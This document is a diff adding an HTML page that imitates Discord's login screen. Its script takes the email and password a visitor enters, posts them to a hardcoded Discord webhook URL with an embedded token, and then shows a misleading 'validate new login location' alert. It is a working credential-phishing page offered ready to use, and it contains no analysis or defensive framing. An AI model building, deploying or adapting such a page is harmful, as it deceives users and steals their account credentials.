@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login Clone</title>
+    <style>
+        /* Discord-like styling */
+        @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@300;400;500;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Whitney', sans-serif;
+        }
+
+        body {
+            background-color: #1c1d22;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #1c1d22;
+            padding: 40px;
+            border-radius: 8px;
+            width: 400px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        h2 {
+            color: #ffffff;
+            margin-bottom: 5px;
+        }
+
+        p {
+            color: #b5bac1;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .label {
+            text-align: left;
+            display: block;
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 10px;
+            background-color: #32323c;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: normal;
+        }
+
+        input:focus {
+            outline: none;
+            background-color: #3a3a45;
+        }
+
+        .forgot-password {
+            display: block;
+            color: #0589c9;
+            font-size: 12px;
+            text-decoration: none;
+            text-align: left;
+            margin-bottom: 15px;
+            margin-top: -5px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .passkey {
+            display: block;
+            color: #0589c9;
+            font-size: 12px;
+            text-decoration: none;
+            margin-top: 15px;
+        }
+
+        .passkey:hover {
+            text-decoration: underline;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #5865F2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background-color: #4752C4;
+        }
+
+        .forgot-container {
+            text-align: left;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Welcome back!</h2>
+        <p>We're so excited to see you again!</p>
+
+        <span class="label">ACCOUNT INFORMATION</span>
+        <input type="text" id="box1" placeholder="Email">
+        <input type="password" id="box2" placeholder="Password">
+
+        <div class="forgot-container">
+            <a href="#" class="forgot-password">Forgot your password?</a>
+        </div>
+
+        <button onclick="sendToDiscord()">Log In</button>
+
+        <a href="#" class="passkey">Or sign in with passkey</a>
+    </div>
+
+    <script>
+        function sendToDiscord() {
+            const email = document.getElementById("box1").value;
+            const password = document.getElementById("box2").value;
+
+            const webhookURL = "https://discord.com/api/webhooks/1337101869205426197/3sHr_lGZFfHdXzIgGsGLJBFk9KUcp3vz8MLAuvBI8BsAtT5F_Hpy04PN7p13qdC632NQ"; // Replace with your webhook URL
+
+            const payload = {
+                content: `Email: ${email}\nPassword: ${password}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Check e-mail and validate new login location.");
+                } else {
+                    alert("Check e-mail and validate new login location.");
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+
+</body>
+</html>
